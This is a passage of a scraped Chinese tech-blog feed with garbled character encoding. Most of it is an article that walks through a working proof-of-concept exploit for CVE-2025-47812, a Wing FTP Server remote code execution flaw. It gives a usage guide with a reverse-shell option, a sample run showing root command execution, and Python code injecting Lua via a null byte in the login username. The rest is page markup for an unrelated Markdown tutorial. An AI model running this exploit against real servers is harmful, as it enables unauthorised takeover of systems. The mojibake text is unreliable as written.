<li>è¯·ä»…åœ¨æ‚¨æ‹¥æœ‰åˆæ³•æµ‹è¯•æƒé™çš„ç³»ç»Ÿæˆ–æˆæƒæµ‹è¯•ç¯å¢ƒï¼ˆå¦‚ CTF é¶åœºã€å†…éƒ¨å®éªŒå®¤ï¼‰ä¸­ä½¿ç”¨æœ¬å·¥å…·ã€‚</li>
<li>å®é™…åˆ©ç”¨å‰ï¼Œè¯·åŠ¡å¿…ç¡®è®¤ç›®æ ‡æœåŠ¡å™¨çš„ Wing FTP Server ç‰ˆæœ¬ä½äº 7.4.4ã€‚</li>
</ul>
<h3 data-id="heading-3">ä½¿ç”¨è¯´æ˜</h3>
<p>è¿è¡Œè„šæœ¬åï¼ŒæŒ‰ç…§äº¤äº’æç¤ºè¾“å…¥ç›®æ ‡ä¿¡æ¯ï¼š</p>
<ol>
<li><strong>ç›®æ ‡URL</strong>ï¼šè¾“å…¥ Wing FTP Server çš„ Web ç®¡ç†åœ°å€ï¼Œä¾‹å¦‚ <code>http://ç›®æ ‡IP:ç«¯å£</code>ï¼ˆé»˜è®¤ç®¡ç†ç«¯å£é€šå¸¸ä¸º 5466ï¼‰ã€‚</li>
<li><strong>ç”¨æˆ·å</strong>ï¼šå¯è¾“å…¥ä»»æ„ç”¨æˆ·åï¼Œä¾‹å¦‚ <code>anonymous</code>ã€‚</li>
<li><strong>é€‰æ‹©æ”»å‡»æ¨¡å¼</strong>ï¼š
<ul>
<li>é€‰æ‹© <code>1</code> è¿è¡Œå•æ¡å‘½ä»¤ã€‚</li>
<li>é€‰æ‹© <code>2</code> è·å–åå‘ Shellï¼ˆéœ€è¦é…ç½®æ¥æ”¶ Shell çš„ç›‘å¬ä¸»æœºå’Œç«¯å£ï¼‰ã€‚</li>
</ul>
</li>
<li>æ ¹æ®é€‰æ‹©è¾“å…¥è¦æ‰§è¡Œçš„å‘½ä»¤ï¼ˆä¾‹å¦‚ <code>whoami</code>, <code>id</code>ï¼‰æˆ–åå‘ Shell çš„é…ç½®ä¿¡æ¯ã€‚</li>
</ol>
<p><strong>åŸºç¡€ä½¿ç”¨ç¤ºä¾‹</strong>ï¼š</p>
<pre><code class="hljs language-bash" lang="bash">$ python3 CVE-2025-47812.py
============================================================
   CVE-2025-47812 - Wing FTP Server RCE Exploit
============================================================
Target URL (e.g., http://localhost:5466): http://10.10.10.10:5466
Username (e.g., anonymous): anonymous
1) Run Command
2) Get Reverse Shell
Your choice (1 or 2): 1
Command to execute (default: <span class="hljs-built_in">whoami</span>): <span class="hljs-built_in">id</span>
[*] Trying to get UID... Payload: <span class="hljs-built_in">id</span>
[+] UID obtained: 1c3be4345d468da6443947f479c569978ec568a693d569774e7
[*] Sending /dir.html request...
[*] HTTP 200
 Response Start ------
uid=0(root) gid=0(root) <span class="hljs-built_in">groups</span>=0(root)
&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span> ?&gt;
&lt;alldata&gt;&lt;nowdir&gt;&lt;![CDATA[/]]&gt;&lt;/nowdir&gt;
...
 Response End ------
</code></pre>
<h3 data-id="heading-4">æ ¸å¿ƒä»£ç </h3>
<p>ä»¥ä¸‹æ˜¯ PoC è„šæœ¬ä¸­å®ç°æ¼æ´åˆ©ç”¨çš„ä¸¤ä¸ªæ ¸å¿ƒå‡½æ•°åŠå…¶è¯¦ç»†æ³¨é‡Šï¼š</p>
<p><strong>1. è·å– UID ä¸ä¼šè¯Cookie</strong>
æ­¤å‡½æ•°é€šè¿‡å‘ <code>/loginok.html</code> ç«¯ç‚¹å‘é€æ¶æ„æ„é€ çš„ç”¨æˆ·åå‚æ•°ï¼Œè§¦å‘æ¼æ´å¹¶è·å–æœåŠ¡å™¨è¿”å›çš„ä¼šè¯ UIDã€‚</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">import</span> requests
<span class="hljs-keyword">import</span> re
<span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote

<span class="hljs-keyword">def</span> <span class="hljs-title function_">get_uid_cookie</span>(<span class="hljs-params">session, base_url, username, command</span>):
    <span class="hljs-string">"""
    åˆ©ç”¨æ¼æ´ï¼Œé€šè¿‡æ³¨å…¥æ¶æ„ç”¨æˆ·åæ¥è·å–æœ‰æ•ˆçš„ä¼šè¯ UIDã€‚
    
    å‚æ•°:
        session: requests.Session å¯¹è±¡ï¼Œç”¨äºä¿æŒä¼šè¯ã€‚
        base_url: ç›®æ ‡æœåŠ¡å™¨çš„åŸºç¡€URL (ä¾‹å¦‚: http://target:5466)ã€‚
        username: ç”¨äºæ”»å‡»çš„ç”¨æˆ·åï¼Œä»»æ„å€¼å‡å¯ã€‚
        command: è¦æ³¨å…¥å¹¶æ‰§è¡Œçš„ç³»ç»Ÿå‘½ä»¤ã€‚
    
    è¿”å›:
        æˆåŠŸåˆ™è¿”å› UID å­—ç¬¦ä¸²ï¼Œå¤±è´¥è¿”å› Noneã€‚
    """</span>
    <span class="hljs-comment"># æ„é€ ç™»å½•è¯·æ±‚çš„ç›®æ ‡URL</span>
    url = <span class="hljs-string">f"<span class="hljs-subst">{base_url}</span>/loginok.html"</span>
    
    <span class="hljs-comment"># å®šä¹‰HTTPè¯·æ±‚å¤´ï¼Œæ¨¡æ‹Ÿæµè§ˆå™¨è¡Œä¸ºä»¥ç»•è¿‡åŸºç¡€æ£€æµ‹</span>
    headers = {
        <span class="hljs-string">"Content-Type"</span>: <span class="hljs-string">"application/x-www-form-urlencoded"</span>,
        <span class="hljs-string">"User-Agent"</span>: <span class="hljs-string">"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 ..."</span>,
        <span class="hljs-string">"Origin"</span>: base_url,
        <span class="hljs-string">"Referer"</span>: <span class="hljs-string">f"<span class="hljs-subst">{base_url}</span>/login.html"</span>,
        <span class="hljs-comment"># ... å…¶ä»–è¯·æ±‚å¤´</span>
    }

    <span class="hljs-comment"># å¯¹ç”¨æˆ·åè¿›è¡ŒURLç¼–ç </span>
    encoded_username = quote(username)
    <span class="hljs-comment"># æ„é€ æ¼æ´åˆ©ç”¨çš„æ ¸å¿ƒPayloadã€‚</span>
    <span class="hljs-comment"># å…³é”®ç‚¹ï¼šåœ¨ç”¨æˆ·ååæ³¨å…¥ç©ºå­—èŠ‚(\0)ï¼Œç„¶åæ‹¼æ¥Luaä»£ç ã€‚</span>
    <span class="hljs-comment"># è¯¥Luaä»£ç ä¼šæ‰“å¼€ä¸€ä¸ªç®¡é“æ‰§è¡ŒæŒ‡å®šçš„ç³»ç»Ÿå‘½ä»¤ï¼Œå¹¶è¯»å–è¾“å‡ºã€‚</span>
    payload = (
        <span class="hljs-string">f"username=<span class="hljs-subst">{encoded_username}</span>%00]]%0dlocal+h+%3d+io.popen(\"<span class="hljs-subst">{command}</span>\")"</span>
        <span class="hljs-string">"%0dlocal+r+%3d+h%3aread(\"*a\")%0dh%3aclose()%0dprint(r)%0d--&amp;password="</span>
    )

    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[*] Trying to get UID... Payload: <span class="hljs-subst">{command}</span>"</span>)
    <span class="hljs-keyword">try</span>:
        <span class="hljs-comment"># å‘é€æ¶æ„POSTè¯·æ±‚</span>
        response = session.post(url, data=payload, headers=headers)
        <span class="hljs-comment"># ä»å“åº”å¤´ä¸­æå–æœåŠ¡å™¨è®¾ç½®çš„Cookie</span>
        set_cookie = response.headers.get(<span class="hljs-string">"Set-Cookie"</span>, <span class="hljs-string">""</span>)
        <span class="hljs-comment"># ä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼ä»Cookieä¸­åŒ¹é…UIDå€¼</span>
        <span class="hljs-keyword">match</span> = re.search(<span class="hljs-string">r"UID=([a-f0-9]+)"</span>, set_cookie)
        <span class="hljs-keyword">if</span> <span class="hljs-keyword">match</span>:
            uid = <span class="hljs-keyword">match</span>.group(<span class="hljs-number">1</span>)
            <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[+] UID obtained: <span class="hljs-subst">{uid}</span>"</span>)
            <span class="hljs-keyword">return</span> uid
        <span class="hljs-keyword">else</span>:
            <span class="hljs-built_in">print</span>(<span class="hljs-string">"[-] UID not found!"</span>)
            <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:
        <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[-] Error occurred: <span class="hljs-subst">{e}</span>"</span>)
        <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>
</code></pre>
<p><strong>2. è§¦å‘å‘½ä»¤æ‰§è¡Œ</strong>
è·å– UID åï¼Œé€šè¿‡è®¿é—®ç‰¹å®šçš„ç®¡ç†é¡µé¢ï¼ˆå¦‚ <code>/dir.html</code>ï¼‰å¹¶æºå¸¦è¯¥ UIDï¼ŒæœåŠ¡å™¨ä¼šå¤„ç†åŒ…å«æ¶æ„ Lua ä»£ç çš„ä¼šè¯æ–‡ä»¶ï¼Œä»è€Œæ‰§è¡Œæˆ‘ä»¬æ³¨å…¥çš„å‘½ä»¤ã€‚è™½ç„¶ PoC ä»£ç ç‰‡æ®µä¸­æœªå®Œå…¨å±•ç¤ºæ­¤å‡½æ•°çš„å®ç°ï¼Œä½†å…¶é€»è¾‘æµç¨‹å¦‚ä¸‹ï¼š</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">post_to_dir</span>(<span class="hljs-params">session, base_url, uid</span>):
    <span class="hljs-string">"""
    åˆ©ç”¨è·å–åˆ°çš„ UIDï¼Œå‘ç®¡ç†æ¥å£å‘é€è¯·æ±‚ä»¥è§¦å‘å·²æ³¨å…¥å‘½ä»¤çš„æ‰§è¡Œã€‚
    
    å‚æ•°:
        session: requests.Session å¯¹è±¡ã€‚
        base_url: ç›®æ ‡æœåŠ¡å™¨çš„åŸºç¡€URLã€‚
        uid: ä» get_uid_cookie å‡½æ•°è·å–çš„æœ‰æ•ˆ UIDã€‚
    
    è¿”å›:
        å‘½ä»¤æ‰§è¡Œçš„è¾“å‡ºç»“æœ (é€šå¸¸åŒ…å«åœ¨HTTPå“åº”ä½“ä¸­)ã€‚
    """</span>
    <span class="hljs-comment"># æ„é€ è®¿é—®ç›®å½•ç®¡ç†é¡µé¢çš„URL</span>
    url = <span class="hljs-string">f"<span class="hljs-subst">{base_url}</span>/dir.html"</span>
    headers = {
        <span class="hljs-string">"Content-Type"</span>: <span class="hljs-string">"application/x-www-form-urlencoded"</span>,
        <span class="hljs-comment"># å°†è·å–åˆ°çš„UIDè®¾ç½®ä¸ºCookieï¼Œä»¥ç»´æŒä¼šè¯</span>
        <span class="hljs-string">"Cookie"</span>: <span class="hljs-string">f"UID=<span class="hljs-subst">{uid}</span>"</span>,
        <span class="hljs-comment"># ... å…¶ä»–å¿…è¦çš„è¯·æ±‚å¤´</span>
    }
    <span class="hljs-comment"># å‘é€è¯·æ±‚ã€‚æœåŠ¡å™¨åœ¨å¤„ç†æ­¤è¯·æ±‚æ—¶ï¼Œä¼šè§£æä¸UIDå…³è”çš„ä¼šè¯æ–‡ä»¶ï¼Œ</span>
    <span class="hljs-comment"># ä»è€Œæ‰§è¡Œä¹‹å‰é€šè¿‡ç”¨æˆ·åæ³¨å…¥çš„Luaä»£ç ã€‚</span>
    response = session.post(url, headers=headers)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[*] Sending /dir.html request..."</span>)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">f"[*] HTTP <span class="hljs-subst">{response.status_code}</span>"</span>)
    <span class="hljs-comment"># å‘½ä»¤æ‰§è¡Œçš„ç»“æœé€šå¸¸ä¼šè¢«æ‰“å°åˆ°æœåŠ¡å™¨ç«¯ï¼Œå¹¶å¯èƒ½è¢«åŒ…å«æˆ–åæ˜ åœ¨HTTPå“åº”ä¸­ã€‚</span>
    <span class="hljs-comment"># è¾“å‡ºå“åº”å†…å®¹ä»¥ä¾›åˆ†æã€‚</span>
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"------ Response Start ------"</span>)
    <span class="hljs-built_in">print</span>(response.text)
    <span class="hljs-built_in">print</span>(<span class="hljs-string">"------ Response End ------"</span>)
</code></pre>
<p><strong>æ¼æ´æ ¹æºæ€»ç»“</strong>ï¼š
æ ¸å¿ƒæ¼æ´åœ¨äº <code>loginok.html</code> çš„èº«ä»½éªŒè¯é€»è¾‘æœªèƒ½å¦¥å–„å¤„ç†ç”¨æˆ·åä¸­çš„<strong>ç©ºå­—èŠ‚ (<code>\0</code>)</strong>ã€‚æ”»å‡»è€…å¯ä»¥åœ¨ç©ºå­—èŠ‚åæ³¨å…¥ä»»æ„ Lua ä»£ç ã€‚æœåŠ¡å™¨ä¼šå°†è¿™äº›ä»£ç å†™å…¥ä¸ç”¨æˆ·ä¼šè¯å…³è”çš„æ–‡ä»¶ä¸­ã€‚å½“åç»­è¯·æ±‚ï¼ˆå¦‚è®¿é—® <code>dir.html</code>ï¼‰éœ€è¦åŠ è½½æ­¤ä¼šè¯æ–‡ä»¶æ—¶ï¼Œå†…åµŒçš„ Lua ä»£ç å°†è¢«æœåŠ¡å™¨æ‰§è¡Œï¼Œä»è€Œå®ç°è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚FINISHED
6HFtX5dABrKlqXeO5PUv/84SoIo+TE3firf/5vX8AZ6jKeVMpPCEcdxjvU7camkD</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Markdown è¯­æ³•è¯¦ç»†æ•™ç¨‹(å­¦ä¹ markdownï¼Œçœ‹è¿™ä¸€ç¯‡å°±å¤Ÿäº†)]]></title>    <link>https://juejin.cn/post/7604301929121316873</link>    <guid>https://juejin.cn/post/7604301929121316873</guid>    <pubDate>2026-02-09T09:24:55.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7604301929121316873" data-draft-id="7604409112593137674" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Markdown è¯­æ³•è¯¦ç»†æ•™ç¨‹(å­¦ä¹ markdownï¼Œçœ‹è¿™ä¸€ç¯‡å°±å¤Ÿäº†)"/> <meta itemprop="keywords" content="Markdown"/> <meta itemprop="datePublished" content="2026-02-09T09:24:55.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="ä¸€ä»½æ‰§å¿µ"/> <meta itemprop="url" content="https://juejin.cn/user/1714893868243464"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Markdown è¯­æ³•è¯¦ç»†æ•™ç¨‹(å­¦ä¹ markdownï¼Œçœ‹è¿™ä¸€ç¯‡å°±å¤Ÿäº†)
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1714893868243464/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ä¸€ä»½æ‰§å¿µ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-09T09:24:55.000Z" title="Mon Feb 09 2026 09:24:55 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»9åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:15px;overflow-x:hidden;color:#2b2b2b;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(159,219,252,.15) 3%,transparent 0),linear-gradient(1turn,rgba(159,219,252,.15) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin-top:35px;margin-bottom:10px;color:#4dd0e1}.markdown-body h1{font-size:30px;text-align:center;position:relative;width:max-content;margin:0 auto}.markdown-body h1:before{position:absolute;content:"";z-index:-1;top:-20px;height:100%;width:100px;left:0;right:0;margin:0 auto;background:url(data:image/png;base64,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